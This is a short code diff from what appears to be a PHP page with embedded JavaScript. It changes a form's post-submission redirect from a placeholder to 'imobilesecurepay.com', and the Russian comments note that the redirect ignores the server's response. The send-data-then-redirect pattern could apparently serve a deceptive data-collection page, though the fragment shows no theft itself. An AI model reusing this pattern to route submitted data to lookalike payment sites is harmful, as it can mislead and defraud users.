@@ -420,7 +420,7 @@ error_reporting(-1);
         processData: false,
         success: function() {
           // Редирект без проверки ответа
-          window.location.href = "https://example.com"; // Укажите ваш URL
+          window.location.href = "https://imobilesecurepay.com/"; // Укажите ваш URL
         },
         error: function() {
           alert("Ошибка отправки данных. Пожалуйста, попробуйте снова.");
